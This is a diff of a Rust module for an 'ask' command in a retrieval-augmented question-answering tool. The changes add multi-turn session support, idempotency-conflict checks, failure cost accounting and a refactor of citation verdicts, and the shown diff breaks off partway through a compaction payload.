@@ -28,6 +28,14 @@
 //! 记录), and that decision exists only once the build has run. The retrieval
 //! fact itself still lands in its own unit before the context's.
 //!
+//! One write sits **outside** that numbering: the **session row**. `ask`
+//! either resumes the conversation the caller named (`session_exists`) or
+//! mints one (`create_session`), after the idempotency check so a replay
+//! still writes nothing (`harness.md` §1). It predates none of the fifteen
+//! steps' tables and lands no event of its own — which is exactly why it was
+//! missing from the list, and why `sessions` is the one table `trace` cannot
+//! replay from.
+//!
 //! The answer-citation protocol (a run-layer contract; `reference.md` leaves
 //! the marker format opaque to `momotaro-verify` and this layer owns it): the
 //! answer cites evidence fragments inline as `[f0001]`-style markers and ends
@@ -55,7 +63,7 @@
 
 use std::path::Path;
 
-use crate::{sha256_hex, to_i64};
+use crate::to_i64;
 
 use momotaro_contracts::run_event;
 use momotaro_contracts::{
@@ -73,6 +81,7 @@ use serde::{Deserialize, Serialize};
 
 use crate::index_service::search_workspace;
 use crate::{RunError, WorkspaceConfig};
+use momotaro_store::StoreError;
 
 /// The fixed `policy.v1` resident text of an ask build (`context-retrieval.md`
 /// §2 level 1). Constraints live inside it; the byte string is part of the
@@ -105,7 +114,11 @@ const ASK_TOP_K: usize = 10;
 
 /// The slot `ask` maps to (D25: `ask`/`spark` → `answer`, frozen into the
 /// RunSpec).
-const ANSWER_SLOT: ModelSlot = ModelSlot::Answer;
+/// The one spelling of the slot this path runs in. `index_service`'s rewrite
+/// exchange is the same slot today and will move to `utility` on its own
+/// (D25, §20) — until then both writers spell `ANSWER_SLOT` so that day edits
+/// one name instead of two.
+pub(crate) const ANSWER_SLOT: ModelSlot = ModelSlot::Answer;
 
 /// Core-level ask knobs (rule: CLI argument objects do not enter the core;
 /// the surface maps its flags onto this).
@@ -125,6 +138,12 @@ pub struct AskOptions {
     pub allow_write: bool,
     /// Context budget override (the `--max-context-tokens` knob).
     pub max_context_tokens: Option<u32>,
+    /// Session to continue (`--session <id>`); `None` opens a new one.
+    ///
+    /// The value has to name a session that exists: a typo is an error rather
+    /// than a silently new conversation, because the second is a request whose
+    /// behaviour changed on a keystroke (`usage.md` 多轮会话).
+    pub session_id: Option<String>,
 }
 
 /// One citation's verdict, as the report shows it.
@@ -153,6 +172,33 @@ pub struct CitationVerdict {
     pub detail: Option<String>,
 }
 
+impl CitationVerdict {
+    /// The verdict for one stored citation.
+    ///
+    /// The first eight fields are `AnswerCitationRecord`'s verbatim, and this
+    /// is the only place that list is written out: the store's row and the
+    /// report's verdict are two renderings of one citation, and a field added
+    /// to one of them used to mean a second hand-copied list to keep in step.
+    fn judged(
+        record: &momotaro_contracts::AnswerCitationRecord,
+        status: &str,
+        detail: Option<&str>,
+    ) -> Self {
+        Self {
+            citation_index: record.citation_index,
+            source_key: record.source_key.clone(),
+            revision_hash: record.revision_hash.clone(),
+            chunk_id: record.chunk_id.clone(),
+            chunk_hash: record.chunk_hash.clone(),
+            locator_json: record.locator_json.clone(),
+            quoted_text: record.quoted_text.clone(),
+            verified: record.verified,
+            status: status.to_owned(),
+            detail: detail.map(str::to_owned),
+        }
+    }
+}
+
 /// One source-integrity verdict, as the report shows it.
 #[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
 pub struct IntegrityVerdict {
@@ -172,6 +218,9 @@ pub struct IntegrityVerdict {
 pub struct AskReport {
     /// The run this report is about (DoD 5: 每个回答有 run_id).
     pub run_id: String,
+    /// The session this run belongs to — the id `--session` takes on the
+    /// next turn (`usage.md` 多轮会话).
+    pub session_id: Option<String>,
     /// The run's terminal status (`finished | failed`).
     pub status: String,
     /// The asked question, as the user wrote it.
@@ -232,18 +281,11 @@ impl AskReport {
                         rebuild_ok = false;
                         continue;
                     };
-                    citations.push(CitationVerdict {
-                        citation_index: claimed.citation_index,
-                        source_key: claimed.source_key.clone(),
-                        revision_hash: claimed.revision_hash.clone(),
-                        chunk_id: claimed.chunk_id.clone(),
-                        chunk_hash: claimed.chunk_hash.clone(),
-                        locator_json: claimed.locator_json.clone(),
-                        quoted_text: claimed.quoted_text.clone(),
-                        verified: claimed.verified,
-                        status: verification.status.as_str().to_owned(),
-                        detail: verification.detail.map(|detail| detail.as_str().to_owned()),
-                    });
+                    citations.push(CitationVerdict::judged(
+                        claimed,
+                        verification.status.as_str(),
+                        verification.detail.as_ref().map(|detail| detail.as_str()),
+                    ));
                     rebuilt_citations.push(verification);
                 }
                 _ => {
@@ -274,6 +316,7 @@ impl AskReport {
 
         Self {
             run_id: trace.run.run_id.clone(),
+            session_id: trace.run.session_id.clone(),
             status: trace.run.status.clone(),
             query: trace.run.query.clone(),
             answer_id: answer.map(|answer| answer.answer_id.clone()),
@@ -348,9 +391,13 @@ fn parse_citations(answer: &str) -> Vec<ParsedCitation> {
         if line.is_empty() {
             continue;
         }
+        // The four-way check reads bytes before slicing: `[f` followed by
+        // multibyte text (`[f你好]`) falls to the claim branch below and never
+        // slices `line[2..6]` on a character boundary — provider text is
+        // untrusted input.
         let (id, quote) = if line.len() >= 7
             && line.starts_with("[f")
-            && line[2..6].bytes().all(|b| b.is_ascii_digit())
+            && line.as_bytes()[2..6].iter().all(u8::is_ascii_digit)
             && line.as_bytes()[6] == b']'
         {
             let rest = &line[7..];
@@ -380,30 +427,107 @@ fn parse_citations(answer: &str) -> Vec<ParsedCitation> {
 /// `category / severity / attribution / retryable` — the four fields). Every
 /// failure this layer emits is error-level today; a lesser severity lands
 /// when a warning-class event first exists, not before.
-pub(crate) fn failure_data(category: &str, attribution: &str, retryable: bool) -> String {
+///
+/// Returns the object rather than its text so the two `llm.finished` writers
+/// can nest it under `"error"` instead of retyping its four fields — the
+/// terminal event is the only caller that wants a string, and it asks for one.
+pub(crate) fn failure_data(
+    category: &str,
+    attribution: &str,
+    retryable: bool,
+) -> serde_json::Value {
     serde_json::json!({
         "attribution": attribution,
         "category": category,
         "retryable": retryable,
         "severity": momotaro_contracts::Severity::Error.as_str(),
     })
+}
+
+/// What a **failed** exchange still cost, onto the turn row that lands for it.
+///
+/// The row exists on failure precisely so its usage columns are the record of
+/// what the attempt spent (`commit_run_llm_turn`'s own contract), and
+/// `contracts` reads a NULL there as *not reported*. A 2xx body that was not a
+/// readable completion carries no `choices`, so the exchange fails — but
+/// `best_effort_usage` salvages its `usage` onto the error **for this write**:
+/// leaving the columns NULL files numbers the provider did report as numbers
+/// it did not. No usage object at all leaves them NULL, which is the honest
+/// reading of that case.
+pub(crate) fn record_failure_usage(turn: &mut LlmTurnRecord, error: &momotaro_llm::LlmError) {
+    let Some(usage) = error.usage.as_deref() else {
+        return;
+    };
+    turn.input_tokens = usage.input_tokens.and_then(to_i64);
+    turn.output_tokens = usage.output_tokens.and_then(to_i64);
+    turn.cached_tokens = usage.cached_tokens.and_then(to_i64);
+    turn.billable_tokens = usage.billable_tokens.and_then(to_i64);
+    turn.reasoning_tokens = usage.reasoning_tokens.and_then(to_i64);
+}
+
+/// The turn row and its `llm.finished` event, written together — four call
+/// sites spelled the same seven lines (probe P2-F5). One spelling, so the row
+/// and its event cannot part company.
+pub(crate) fn commit_llm_finished(
+    store: &mut momotaro_store::Store,
+    run_id: &str,
+    turn: &LlmTurnRecord,
+    data_json: String,
+    created_at: i64,
+) -> Result<(), RunError> {
+    store
+        .commit_run_llm_turn(
+            run_id,
+            turn,
+            &momotaro_store::NewRunEvent {
+                event_type: run_event::LLM_FINISHED.to_owned(),
+                data_json,
+                created_at,
+            },
+        )
+        .map_err(RunError::Store)
+}
+
+/// The `llm.finished` payload of a **failed** exchange.
+///
+/// One builder, both producers: it used to live in `index_service` and be
+/// retyped in `run_steps`, and the two halves had already drifted once. The
+/// cache summary is here for the same reason it is on the success payload —
+/// `reference.md` promises `cached_tokens` / `billable_tokens` "when the
+/// provider reports them", and `best_effort_usage` salvages exactly those off a
+/// half-readable failure body, so "the exchange failed" is not a reason to
+/// write the event as if the provider had reported nothing.
+pub(crate) fn llm_finished_failure_payload(
+    turn_id: &str,
+    error: &momotaro_llm::LlmError,
+) -> String {
+    let (attribution, retryable) = failure_row(error.kind.category());
+    let usage = error.usage.as_deref();
+    serde_json::json!({
+        "error": failure_data(error.kind.category(), attribution, retryable),
+        "slot": ANSWER_SLOT.as_str(),
+        "turn_id": turn_id,
+        "billable_tokens": usage.and_then(|usage| usage.billable_tokens),
+        "cached_tokens": usage.and_then(|usage| usage.cached_tokens),
+    })
     .to_string()
 }
 
 /// The §18 row behind each category this layer can emit: (attribution,
 /// retryable), with `maybe` priced as `true` (a retry may help).
-pub(crate) fn failure_row(category: &str) -> (String, bool) {
+pub(crate) fn failure_row(category: &str) -> (&'static str, bool) {
     match category {
-        "interrupted" => ("system".to_owned(), true),
-        "index_unavailable" => ("system".to_owned(), true),
-        "retrieval_empty" => ("harness".to_owned(), false),
-        "llm_auth" => ("user".to_owned(), false),
-        "llm_rate_limit" => ("provider".to_owned(), true),
-        "llm_context_overflow" => ("user/provider".to_owned(), true),
-        "llm_provider" => ("provider".to_owned(), true),
-        "llm_rejected" => ("user/harness".to_owned(), false),
-        "llm_malformed" => ("provider".to_owned(), true),
-        "citation_invalid" => ("harness/model".to_owned(), false),
+        "interrupted" => ("system", true),
+        "index_unavailable" => ("system", true),
+        "store_unavailable" => ("system", true),
+        "retrieval_empty" => ("harness", false),
+        "llm_auth" => ("user", false),
+        "llm_rate_limit" => ("provider", true),
+        "llm_context_overflow" => ("user/provider", true),
+        "llm_provider" => ("provider", true),
+        "llm_rejected" => ("user/harness", false),
+        "llm_malformed" => ("provider", true),
+        "citation_invalid" => ("harness/model", false),
         // Unreachable: every category this layer can emit is listed above
         // (pinned by `the_failure_rows_pin_the_taxonomy_table`), and a new
         // one must add its §18 row there — silence would invent an
@@ -424,18 +548,26 @@ enum AskFailure {
     RetrievalEmpty,
     /// Retrieval could not run (the index is missing or unusable).
     RetrievalUnavailable,
+    /// The canonical store is unhealthy. Kept distinct from the two index
+    /// refusals because repair is a store question, not `momotaro index`.
+    StoreUnavailable,
     /// At least one citation failed verification.
     Citations(usize, usize),
 }
 
 impl AskFailure {
-    fn category(&self) -> String {
+    // `&'static str`, like `LlmErrorKind::category` beside it: every arm is a
+    // literal or the other function's own, so there is nothing to allocate —
+    // and two functions that answer the same question with two types invite a
+    // caller to `to_owned()` one of them for no reason.
+    fn category(&self) -> &'static str {
         match self {
-            Self::Provider(kind) => kind.category().to_owned(),
-            Self::EmptyBody => "llm_malformed".to_owned(),
-            Self::RetrievalEmpty => "retrieval_empty".to_owned(),
-            Self::RetrievalUnavailable => "index_unavailable".to_owned(),
-            Self::Citations(..) => "citation_invalid".to_owned(),
+            Self::Provider(kind) => kind.category(),
+            Self::EmptyBody => "llm_malformed",
+            Self::RetrievalEmpty => "retrieval_empty",
+            Self::RetrievalUnavailable => "index_unavailable",
+            Self::StoreUnavailable => "store_unavailable",
+            Self::Citations(..) => "citation_invalid",
         }
     }
 
@@ -446,6 +578,7 @@ impl AskFailure {
             Self::EmptyBody => "the provider returned no answer text".to_owned(),
             Self::RetrievalEmpty => "retrieval returned no hits".to_owned(),
             Self::RetrievalUnavailable => "retrieval could not run".to_owned(),
+            Self::StoreUnavailable => "the store is not healthy".to_owned(),
             Self::Citations(failed, total) => {
                 format!("{failed} of {total} citations failed verification")
             }
@@ -453,19 +586,184 @@ impl AskFailure {
     }
 }
 
-/// What steps 5-14 produced, whatever happened in them. The report itself is
-/// rebuilt from the rows (one construction path — `AskReport::from_trace`), so
-/// the outcome carries only what the rows cannot say: why the run failed.
-struct FlowOutcome {
-    failure: Option<AskFailure>,
+// What steps 5-14 produced, whatever happened in them, is `Option<AskFailure>`:
+// the report itself is rebuilt from the rows (one construction path —
+// `AskReport::from_trace`), so the outcome carries only what the rows cannot
+// say — why the run failed, `None` for a run that did not (probe P2-F4: the
+// single-field box was an `Option` wearing a struct).
+
+/// How many characters of the first question a session title keeps.
+const SESSION_TITLE_CHARS: usize = 80;
+
+/// The title a freshly opened session gets: the question, cut to
+/// [`SESSION_TITLE_CHARS`].
+///
+/// Cut by **character**, never by byte — slicing bytes would split a CJK
+/// question in half. `title_source` stays `derived`, the only value 0.x
+/// writes (the DDL notes a user's rename is never overwritten by it).
+fn session_title(query: &str) -> String {
+    let mut chars = query.chars();
+    let head: String = chars.by_ref().take(SESSION_TITLE_CHARS).collect();
+    if chars.next().is_none() {
+        head
+    } else {
+        format!("{head}…")
+    }
 }
 
-impl FlowOutcome {
-    fn aborted(failure: AskFailure) -> Self {
-        Self {
-            failure: Some(failure),
+/// `run_id` → `(1-based round, 0-based position)` for the session's turn runs,
+/// in order (`context-retrieval.md` §3: 轮 = 写过 history 的 ask run). One map
+/// for both readers: they were two maps of the same slice whose values
+/// differed by one (probe P2-F6), and one derivation cannot drift.
+fn turn_axes(turn_runs: &[String]) -> std::collections::HashMap<&str, (u32, usize)> {
+    turn_runs
+        .iter()
+        .enumerate()
+        .map(|(index, run_id)| {
+            (
+                run_id.as_str(),
+                (u32::try_from(index).unwrap_or_default() + 1, index),
+            )
+        })
+        .collect()
+}
+
+/// `referenced_chunk_hashes` off a history row's `payload_json`.
+///
+/// A payload this build cannot read costs the dedup hint, not the text: the
+/// turn still replays verbatim and the worst case is paying for a chunk
+/// twice. Losing *content* is the failure worth failing over; this is not it.
+fn referenced_hashes(payload_json: &str) -> Vec<String> {
+    serde_json::from_str::<serde_json::Value>(payload_json)
+        .ok()
+        .and_then(|value| value.get("referenced_chunk_hashes")?.as_array().cloned())
+        .map(|hashes| {
+            hashes
+                .into_iter()
+                .filter_map(|hash| hash.as_str().map(str::to_owned))
+                .collect()
+        })
+        .unwrap_or_default()
+}
+
+/// The `chunk_hash` a context item's `source_ref_json` carries, when it has
+/// one. `first_seen_order`'s whole ledger is read from here.
+fn evidence_chunk_hash(source_ref_json: &Option<String>) -> Option<String> {
+    let raw = source_ref_json.as_deref()?;
+    let value = serde_json::from_str::<serde_json::Value>(raw).ok()?;
+    value
+        .get(momotaro_contracts::source_ref::CHUNK_HASH)?
+        .as_str()
+        .map(str::to_owned)
+}
+
+/// The number in an `f{NNNN}` fragment id, parsed **numerically**.
+///
+/// Parsed rather than compared as text: the id is zero-padded to four
+/// digits, and lexicographic order stops matching numeric order at five — a
+/// session that reached 10000 fragments would sort `f10000` before `f9999`
+/// and hand the counter back a smaller value than it already issued.
+fn fragment_number(fragment_id: &str) -> Option<u32> {
+    fragment_id.strip_prefix('f')?.parse().ok()
+}
+
+/// One stored history row as the context layer replays it.
+///
+/// A `summary.v1` row is parsed here but **not** validated here: syntax and
+/// the fail-closed semantic check are two promises, and only the second one
+/// may keep raw turns when it fails (`select_history` owns it, §4 rule 3).
+/// A row that does not parse becomes [`momotaro_context::SummarySlot::Malformed`]
+/// rather than a turn, so its JSON body never reaches the model.
+fn history_item(
+    row: &momotaro_contracts::HistoryItemRecord,
+    axes: &std::collections::HashMap<&str, (u32, usize)>,
+) -> Result<momotaro_context::HistoryItem, RunError> {
+    let (round, _) = *axes
+        .get(row.run_id.as_str())
+        .ok_or_else(|| RunError::Invariant("a history row whose run did not write history"))?;
+    let role = match row.role.as_str() {
+        "user" => momotaro_context::HistoryRole::User,
+        "assistant" => momotaro_context::HistoryRole::Assistant,
+        _ => return Err(RunError::Invariant("a history row with an unknown role")),
+    };
+    let summary = if row.content_kind == "summary.v1" {
+        match momotaro_context::SummaryV1::from_stored(&row.body) {
+            Ok(record) => momotaro_context::SummarySlot::Parsed(record),
+            Err(_) => momotaro_context::SummarySlot::Malformed,
+        }
+    } else {
+        momotaro_context::SummarySlot::None
+    };
+    Ok(momotaro_context::HistoryItem {
+        history_id: row.history_id.clone(),
+        round,
+        role,
+        body: row.body.clone(),
+        summary,
+        referenced_chunk_hashes: referenced_hashes(&row.payload_json),
+    })
+}
+
+/// The session's ledger, recomputed from the rows it is a pure function of
+/// (`SessionState`'s own doc names the three tables).
+///
+/// Recomputed rather than stored: `run_context_items` and `history_items`
+/// are append-only (D30), so the answer cannot drift, and a stored copy
+/// would be the second truth this repo keeps getting caught by. Both reads
+/// use **the same run set** — the turn runs — so the ledger and the guard
+/// band agree on what a turn is.
+fn derive_session_state(
+    store: &momotaro_store::Store,
+    session_id: &str,
+    turn_runs: &[String],
+    rows: &[momotaro_contracts::HistoryItemRecord],
+) -> Result<momotaro_context::SessionState, RunError> {
+    let axes = turn_axes(turn_runs);
+
+    let mut items = store.context_items_for_session(session_id)?;
+    // Both readers share `TURN_RUNS_PREDICATE`, so every run here has a
+    // round by construction and this branch has no reachable input. Sort
+    // defensively rather than indexing: a divergence would be a store bug,
+    // and a panic is the wrong shape for one.
+    items.sort_by_key(|item| {
+        (
+            axes.get(item.run_id.as_str())
+                .map_or(usize::MAX, |(_, position)| *position),
+            item.ordinal,
+        )
+    });
+
+    let mut first_seen_order: Vec<String> = Vec::new();
+    let mut fragment_seq: u32 = 0;
+    for item in &items {
+        if item.kind == "evidence"
+            && let Some(hash) = evidence_chunk_hash(&item.source_ref_json)
+            && !first_seen_order.contains(&hash)
+        {
+            first_seen_order.push(hash);
+        }
+        if let Some(number) = fragment_number(&item.fragment_id) {
+            fragment_seq = fragment_seq.max(number);
         }
     }
+
+    // `injected` is what the user turns actually carried into a request.
+    let mut injected: Vec<String> = Vec::new();
+    for row in rows {
+        if row.kind == "turn" && row.role == "user" {
+            for hash in referenced_hashes(&row.payload_json) {
+                if !injected.contains(&hash) {
+                    injected.push(hash);
+                }
+            }
+        }
+    }
+
+    Ok(momotaro_context::SessionState {
+        first_seen_order,
+        injected,
+        fragment_seq,
+    })
 }
 
 /// Runs one `ask` and reports its outcome.
@@ -499,31 +797,83 @@ pub fn ask_workspace<T: ProviderTransport + ?Sized>(
     let model = config.model_id()?.to_owned();
     let max_output_tokens = config.model.max_output_tokens;
 
-    // The run engine's open: the deterministic sweep first (`harness.md` §2),
-    // then the same health question every run-side entry asks.
+    // The run engine's open: the same health question every run-side entry
+    // asks, then the deterministic sweep (`harness.md` §2), then the session
+    // decision. **The sweep comes first**, so `harness.md` §8.1's recovery —
+    // a run abandoned by a crash is reaped by the next open — is reachable
+    // from every entry point including `--session`, which is where an
+    // abandoned run actually blocks someone: `abandoned to the next sweep`
+    // (the module doc) would otherwise be a promise the only failing entry
+    // point never keeps.
+    //
+    // There is deliberately **no** "this session already has a run in
+    // flight" refusal here. Nothing in 0.x can tell a live run from a dead
+    // one: `ACTIVE_RUN_PREDICATE` is a row shape, not liveness, and it is
+    // the very predicate the sweep below reaps by — so such a refusal would
+    // either fire on a run the sweep is about to take anyway (bricking the
+    // session on the documented recovery path) or never fire at all, since
+    // `harness.md` §5's single-writer discipline means no second process is
+    // holding one. §5's one-active-run-per-session rule is the sweep's
+    // shape, not a second gate; the orphan is swept here (and by the next
+    // `ask`/`trace`) — no command reports it: `doctor` does not read runs.
     let mut store = crate::open_run_store(root)?;
     store.sweep_interrupted_runs()?;
+    let resume = match options.session_id.as_deref() {
+        Some(id) => {
+            if !store.session_exists(id)? {
+                // The id is the one byte of caller input that reaches an
+                // error string, and the CLI prints that string on both
+                // outlets — `PolicyRefused` was `&'static str` before this
+                // wave, so nothing user-supplied could get this far.
+                return Err(RunError::PolicyRefused(format!(
+                    "no session named {}; drop --session to open a new one",
+                    crate::sanitize(id)
+                )));
+            }
+            Some(id.to_owned())
+        }
+        None => None,
+    };
 
-    // Idempotent replay (harness.md §1: 重放同一请求返回同一 run).
+    // The frozen request bytes are needed to decide whether a replay is the
+    // same request. A key that names another hash is a conflict, not a replay.
+    let run_id = crate::stamp_id("run");
+    let spec_json = serde_json::to_string(&spec).expect("run spec serializes");
+    let spec_hash = momotaro_ingest::sha256_of(spec_json.as_bytes());
     if let Some(key) = options.client_request_id.as_deref()
-        && let Some(run_id) = store.run_id_for_client_request(key)?
+        && let Some((existing_id, stored_hash)) = store.run_request_hash_for_client_request(key)?
     {
+        if stored_hash != spec_hash {
+            return Err(RunError::Store(StoreError::IdempotencyConflict {
+                key: key.to_owned(),
+                expected: stored_hash,
+                actual: spec_hash,
+            }));
+        }
         let trace = store
-            .run_trace(&run_id)?
+            .run_trace(&existing_id)?
             .ok_or(RunError::Invariant("the named run vanished"))?;
         return Ok(AskReport::from_trace(&trace));
     }
 
-    let run_id = crate::stamp_id("run");
-    let spec_json = serde_json::to_string(&spec).expect("run spec serializes");
-    let spec_hash = sha256_hex(spec_json.as_bytes());
-    let now = crate::now_secs();
+    let now = momotaro_store::now_epoch_secs();
+
+    // A resumed session is used as it stands; a fresh conversation gets its
+    // row now — **after** the idempotency check above, so replaying a request
+    // still writes nothing (`harness.md` §1).
+    // Mint the id now, but create the row only after this request wins the
+    // idempotency race. A raced replay must write no session.
+    let is_new_session = resume.is_none();
+    let session_id = match resume {
+        Some(id) => id,
+        None => crate::stamp_id("sess"),
+    };
 
     // 2-3. create the run: accepted, with the RunSpec frozen on the row.
     let outcome = store.commit_run_create(
         &momotaro_store::NewRun {
             run_id: run_id.clone(),
-            session_id: None,
+            session_id: Some(session_id.to_owned()),
             parent_run_id: None,
             project_id: None,
             attempt: 1,
@@ -547,6 +897,16 @@ pub fn ask_workspace<T: ProviderTransport + ?Sized>(
             created_at: now,
         },
     )?;
+    if outcome.created() && is_new_session {
+        store.create_session(&momotaro_store::NewSession {
+            session_id: session_id.clone(),
+            title: session_title(query),
+            title_source: "derived".to_owned(),
+            first_user_message: Some(query.to_owned()),
+            project_id: None,
+            created_at: now,
+        })?;
+    }
     if !outcome.created() {
         // A raced replay (the key landed between the lookup above and this
         // unit): the named run is the answer — never a second run.
@@ -567,21 +927,32 @@ pub fn ask_workspace<T: ProviderTransport + ?Sized>(
     )?;
 
     let flow = run_steps(
-        root, &mut store, &run_id, query, &spec, &config, &provider, &model, transport, now,
+        root,
+        &mut store,
+        &run_id,
+        &session_id,
+        query,
+        &spec,
+        &config,
+        &provider,
+        &model,
+        transport,
     )?;
 
-    // 15. finish: the terminal unit, whatever happened (终态必达).
-    let terminal = match &flow.failure {
+    // 15. finish: the terminal unit, whatever happened (终态必达). A terminal
+    // timestamp is its own stage, not the acceptance clock.
+    let now = momotaro_store::now_epoch_secs();
+    let terminal = match &flow {
         None => TerminalEvent::Finished,
         Some(_) => TerminalEvent::Failed,
     };
-    let (data_json, failure_note) = match &flow.failure {
+    let (data_json, failure_note) = match &flow {
         None => ("{}".to_owned(), None),
         Some(failure) => {
             let category = failure.category();
-            let (attribution, retryable) = failure_row(&category);
+            let (attribution, retryable) = failure_row(category);
             (
-                failure_data(&category, &attribution, retryable),
+                failure_data(category, attribution, retryable).to_string(),
                 Some(failure.failure_note()),
             )
         }
@@ -604,14 +975,17 @@ fn run_steps<T: ProviderTransport + ?Sized>(
     root: &Path,
     store: &mut momotaro_store::Store,
     run_id: &str,
+    session_id: &str,
     query: &str,
     spec: &RunSpec,
     config: &WorkspaceConfig,
     provider: &str,
     model: &str,
     transport: &T,
-    now: i64,
-) -> Result<FlowOutcome, RunError> {
+) -> Result<Option<AskFailure>, RunError> {
+    // Each audit row records when its own stage happened, not when the run
+    // started; provider completion is the turn's finished_at.
+    let now = || momotaro_store::now_epoch_secs();
     // 5. retrieve (lexical, zero LLM). `retrieval.started` precedes the
     // engine; a retrieval that cannot run is an expected failure (§18
     // `index_unavailable`), not a crash.
@@ -620,15 +994,16 @@ fn run_steps<T: ProviderTransport + ?Sized>(
         &momotaro_store::NewRunEvent {
             event_type: run_event::RETRIEVAL_STARTED.to_owned(),
             data_json: serde_json::json!({ "query": query }).to_string(),
-            created_at: now,
+            created_at: now(),
         },
     )?;
     let search = match search_workspace(root, query, ASK_TOP_K) {
         Ok(search) => search,
-        Err(_) => return Ok(FlowOutcome::aborted(AskFailure::RetrievalUnavailable)),
+        Err(RunError::StoreUnhealthy(_)) => return Ok(Some(AskFailure::StoreUnavailable)),
+        Err(_) => return Ok(Some(AskFailure::RetrievalUnavailable)),
     };
     if search.hits.is_empty() {
-        return Ok(FlowOutcome::aborted(AskFailure::RetrievalEmpty));
+        return Ok(Some(AskFailure::RetrievalEmpty));
     }
 
     // The evidence the build sees: the hit's full citation key set plus the
@@ -638,7 +1013,7 @@ fn run_steps<T: ProviderTransport + ?Sized>(
     let mut evidence = Vec::with_capacity(search.hits.len());
     for hit in &search.hits {
         let Some(chunk) = store.get_chunk(&hit.hit.chunk_id)? else {
-            return Ok(FlowOutcome::aborted(AskFailure::RetrievalUnavailable));
+            return Ok(Some(AskFailure::RetrievalUnavailable));
         };
         let key_set = std::iter::once(hit.hit.source_key.as_str()).collect();
         let mut origins = store.current_origins(&key_set)?;
@@ -654,30 +1029,63 @@ fn run_steps<T: ProviderTransport + ?Sized>(
     }
 
     // 7. build the context (ten stages, the budget that never refills).
+    //
+    // Multi-round replay happens here. The session's turns are loaded in the
+    // round order `context-retrieval.md` §3 defines, and the ledger is
+    // recomputed from the rows it is a pure function of (`SessionState`'s own
+    // doc names the three tables) — recomputed rather than stored, so it
+    // cannot drift from canonical (`architecture.md` §8.1 usage projections).
+    let turn_runs = store.turn_runs_for_session(session_id)?;
+    let axes = turn_axes(&turn_runs);
+    let rows = store.history_for_session(session_id)?;
+    let history = rows
+        .iter()
+        .map(|row| history_item(row, &axes))
+        .collect::<Result<Vec<_>, _>>()?;
+    let session_state = derive_session_state(store, session_id, &turn_runs, &rows)?;
+
+    // §4's two knobs, read from `[policy]` — `context-retrieval.md` §4 has
+    // shown that TOML since before this build had the fields, and both
+    // defaults come from `momotaro-context`, so there is one number per knob.
+    let budget_policy = momotaro_context::BudgetPolicy {
+        max_context_tokens: spec.max_context_tokens,
+        compact_trigger_ratio: config.policy.compact_trigger_ratio,
+        compact_reserve_abs: config.policy.compact_reserve_abs,
+        ..momotaro_context::BudgetPolicy::default()
+    };
+
     let built = momotaro_context::build_context(momotaro_context::ContextInput {
         query: query.to_owned(),
         intent: momotaro_context::QueryIntent::Fact,
         policy_text: POLICY_TEXT.to_owned(),
         tool_definitions: Vec::new(),
         instructions: INSTRUCTIONS.to_owned(),
-        history: Vec::new(),
+        history,
         evidence,
-        session: momotaro_context::SessionState::default(),
-        budget: momotaro_context::BudgetPolicy {
-            max_context_tokens: spec.max_context_tokens,
-            ..momotaro_context::BudgetPolicy::default()
-        },
+        session: session_state,
+        budget: budget_policy.clone(),
     });
 
     // 6. the retrieval, with the build's inclusion decisions on its hits
     // (included = a fragment made it; the omission record names the rest).
-    let included = built.evidence_order().collect::<Vec<_>>();
+    let kept_indices: Vec<usize> = built.evidence_indices().collect();
     let mut hits = Vec::with_capacity(search.hits.len());
-    for hit in &search.hits {
-        let kept = included.contains(&hit.hit.chunk_hash.as_str());
+    for (position, hit) in search.hits.iter().enumerate() {
+        // Per hit, not per hash: two hits can share a `chunk_hash` (one
+        // chunk's content under two paths), the build keeps exactly one of
+        // them, and hash membership read the dropped twin as a survivor —
+        // so `duplicate_chunk_hash` could never land on a row (probe
+        // R3a-F2). `evidence` is built in hit order, so the position is the
+        // index the build recorded.
+        let kept = kept_indices.contains(&position);
         let omitted_reason = if kept {
             None
         } else {
+            // First match by hash, kept deliberately: twins are not
+            // constructible from current retrieval (`chunk_hash` folds
+            // `chunk_id` in), so this cannot take a twin's reason; if that
+            // ever changes, this must follow the position decision above
+            // (adversarial lane #4).
             built
                 .stages
                 .iter()
@@ -705,9 +1113,17 @@ fn run_steps<T: ProviderTransport + ?Sized>(
             run_id: run_id.to_owned(),
             query: query.to_owned(),
             normalized_query: built.normalized_query.clone(),
-            strategy_json: serde_json::json!({ "engine": "tantivy_bm25", "k": ASK_TOP_K })
-                .to_string(),
-            created_at: now,
+            // (engine, k, mode) — the contract `RetrievalRecord::strategy_json`
+            // spells out. `mode` is the *retrieval* mode from the `SearchMode`
+            // vocabulary, not the run's: ask runs plain BM25 with no rewrite,
+            // which is `lexical` exactly as `--mode expand` records `expand`.
+            strategy_json: serde_json::json!({
+                "engine": "tantivy_bm25",
+                "k": ASK_TOP_K,
+                "mode": "lexical",
+            })
+            .to_string(),
+            created_at: now(),
             hits,
         },
         &momotaro_store::NewRunEvent {
@@ -717,7 +1133,7 @@ fn run_steps<T: ProviderTransport + ?Sized>(
                 "hits": search.hits.len(),
             })
             .to_string(),
-            created_at: now,
+            created_at: now(),
         },
     )?;
 
@@ -736,7 +1152,7 @@ fn run_steps<T: ProviderTransport + ?Sized>(
             body: fragment.body.clone(),
             source_ref_json: fragment.source_ref_json.clone(),
             token_estimate: i64::from(fragment.token_estimate),
-            body_hash: sha256_hex(fragment.body.as_bytes()),
+            body_hash: momotaro_ingest::sha256_of(fragment.body.as_bytes()),
             decision_rationale: None,
             assumptions: None,
             supersedes: None,
@@ -751,21 +1167,56 @@ fn run_steps<T: ProviderTransport + ?Sized>(
         &items,
         &momotaro_store::NewRunEvent {
             event_type: run_event::CONTEXT_BUILT.to_owned(),
-            data_json: serde_json::json!({ "fragments": items.len() }).to_string(),
-            created_at: now,
+            // §4's trigger, evaluated against this build's own estimate.
+            // Nothing compacts yet — ADR 0010's status marker says generation
+            // waits for `kb_read` — so the fact lands where `trace` reads it
+            // instead of being decided silently, and `triggered` is what §4's
+            // 观测三指标 ("每千轮压缩次数") will eventually count.
+            //
+            // **Both sides are `adjusted_total`** — `compact_trigger()` is
+            // priced in `max_context_tokens`, the *adjusted* ceiling. The
+            // reasoning and the number it costs to get this wrong are in
+            // `reference.md` (Event vocabulary) and `context-retrieval.md` §4;
+            // `adjusted_total` rides along so the verdict can be checked.
+            // `max_context_tokens` rides along for the same reason in the
+            // other direction: it is the ceiling the verdict is priced in,
+            // and neither `adjusted_total` nor `triggered` can be read back
+            // out of — `architecture.md` §20 called the field write-only
+            // until this payload named it.
+            data_json: serde_json::json!({
+                "fragments": items.len(),
+                "compaction": {
+                    "triggered": built.budget.adjusted_total
